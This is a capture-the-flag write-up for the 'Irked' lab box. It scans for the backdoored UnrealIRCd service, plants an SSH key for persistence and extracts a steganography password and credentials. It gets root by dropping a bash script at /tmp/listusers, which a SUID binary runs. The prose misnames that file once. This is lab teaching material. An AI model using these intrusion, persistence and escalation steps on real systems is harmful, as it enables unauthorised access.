# Writeup Irked

## Scan

```bash
$ nmap -sS -T4 -p- -vv $target

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
80/tcp    open  http       syn-ack ttl 63
111/tcp   open  rpcbind    syn-ack ttl 63
6697/tcp  open  ircs-u     syn-ack ttl 63
8067/tcp  open  infi-async syn-ack ttl 63
46561/tcp open  unknown    syn-ack ttl 63
65534/tcp open  unknown    syn-ack ttl 63
```

## Enumeration

It seems there is an IRC service running on port 6697.
```bash
$ weechat
/server add irked 10.10.10.117
/connect irked
│16:12:31   irked  -- | This server was created Mon May 14 2018 at 13:12:50 EDT
│16:12:31   irked  -- | irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
```

Let's look for irc scripts.
```bash
$ locate "*.nse" | grep irc
$ nmap --script irc-unrealircd-backdoor -p6697 $target
PORT     STATE SERVICE REASON
6697/tcp open  ircs-u  syn-ack ttl 63
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
```
There is an empty `~ircd/.ssh` folder and `PublicKeyAuth` is enabled.  
We can generate our own public key pair to gain persistent ssh access.
```bash
# on remote
$ cat /etc/ssh/sshd_config
...
PubkeyAuthentication yes
```
```bash
# attacker
$ mkdir -p ~/.ssh/
$ ssh-keygen -t rsa
$ vim config
Host 10.10.10.117
    HostName 10.10.10.117
	User ircd
	IdentityFile ~/.ssh/htb
$ chmod 644 config
# send htb.pub to remote machine
$ cat htb.pub >> authorized_keys
$ chmod 600 authorized_keys
# attacker
$ ssh -vvF ~/.ssh/config $target
```

## Privilege Escalation
There is a world readable file in `/home/djmardov` and also a hint in `.bash_history` that LSB steganography was used on the image.  
```bash
$ find / -xdev -not \( -user $USER -or -user 0 \) \
  -not \( -group $USER -or -group 0 \) -perm -o+r \
  -exec ls -lad \{} \; 2>/dev/null

-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup
$ cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

```bash
# attacker
$ apt install steghide
$ steghide extract -sf irked.jpg -xf out
$ file out
out.jpg: ASCII text
$ cat out
Kab6h+m+bbp2J:HG
$ sshpass -p 'Kab6h+m+bbp2J:HG' ssh djmardov@$target
```

There is a binary with SUID bit set that we can reverse:
```bash
$ find / -perm -4000 -user 0 -type f -exec ls -latr \{} \; 2>/dev/null
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
```

### Static Binary Analysis

The binary is dynamically linked to libc:
```bash
$ for i in {1..3}; do ldd viewuser | grep libc; done
libc.so.6 => /lib32/libc.so.6 (0xf7d4e000)
libc.so.6 => /lib32/libc.so.6 (0xf7cd2000)
libc.so.6 => /lib32/libc.so.6 (0xf7cfb000)
```

We can see 2 calls to `put` followed by a call to `setuid` and `system`.  
```bash
$ objdump -M intel -d viewuser| grep main.: -A40
0000057d <main>:
 57d:   8d 4c 24 04             lea    ecx,[esp+0x4]
 581:   83 e4 f0                and    esp,0xfffffff0
 584:   ff 71 fc                push   DWORD PTR [ecx-0x4]
 ...
  5d2:   e8 49 fe ff ff          call   420 <setuid@plt>
 5d7:   83 c4 10                add    esp,0x10
 5da:   83 ec 0c                sub    esp,0xc
 5dd:   8d 83 f1 e6 ff ff       lea    eax,[ebx-0x190f]
 5e3:   50                      push   eax
 5e4:   e8 17 fe ff ff          call   400 <system@plt>
```

The argument (`const char*`) for system call `system` get's pushed onto the stack.  
`ebx` is used to reference the address and gets assigned here:
```
 58c:   e8 ef fe ff ff          call   480 <__x86.get_pc_thunk.bx>
 591:   81 c3 6f 1a 00 00       add    ebx,0x1a6f
```
This call is used in position independent code (PIC) on x86 and makes `ebx` directly point into our global offset table (GOT). So what is the argument of `system`? With all that information we can calculate the address that gets pushed on the stack. The address directly points into the .rodata section and points to the string `/tmp/userlist`.
```bash
$ python -c 'print hex(0x591+0x1a6f-0x190f)'
0x6f1
$ readelf -S viewuser
...
[16] .rodata           PROGBITS        00000678 000678 000088 00   A  0   0  4
...
$ hexdump -C -s 0x6f1 -n 16 viewuser
000006f1  2f 74 6d 70 2f 6c 69 73  74 75 73 65 72 73 00 01  |/tmp/listusers..|
```
Alternative way to view `.rodata` section:
```bash
$ objdump -dj .rodata viewuser
viewuser:     file format elf32-i386

Disassembly of section .rodata:

00000678 <_fp_hw>:
 678:	03 00 00 00                                         ....

0000067c <_IO_stdin_used>:
 67c:	01 00 02 00 54 68 69 73 20 61 70 70 6c 69 63 61     ....This applica
 68c:	74 69 6f 6e 20 69 73 20 62 65 69 6e 67 20 64 65     tion is being de
 69c:	76 6c 65 6f 70 65 64 20 74 6f 20 73 65 74 20 61     vleoped to set a
 6ac:	6e 64 20 74 65 73 74 20 75 73 65 72 20 70 65 72     nd test user per
 6bc:	6d 69 73 73 69 6f 6e 73 00 00 00 00 49 74 20 69     missions....It i
 6cc:	73 20 73 74 69 6c 6c 20 62 65 69 6e 67 20 61 63     s still being ac
 6dc:	74 69 76 65 6c 79 20 64 65 76 65 6c 6f 70 65 64     tively developed
 6ec:	00 77 68 6f 00 2f 74 6d 70 2f 6c 69 73 74 75 73     .who./tmp/listus
 6fc:	65 72 73 00                                         ers.
```
So obviously the file `/tmp/userlist` gets executed as root an the machine.

### Get root shell
```bash
djmardov@irked:/tmp$ echo -e '#!/bin/bash\n/bin/bash' > listusers
djmardov@irked:/tmp$ chmod 777 listusers
djmardov@irked:/tmp$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-03-30 16:41 (:0)
djmardov pts/2        2019-03-30 18:22 (10.10.14.22)
djmardov pts/3        2019-03-30 18:44 (10.10.14.20)
root@irked:/tmp# whoami
root
```

**References:**
* https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html  
* https://thoughts.theden.sh/post/elfmagic/  
* https://www.suse.com/c/making-sense-hexdump/  
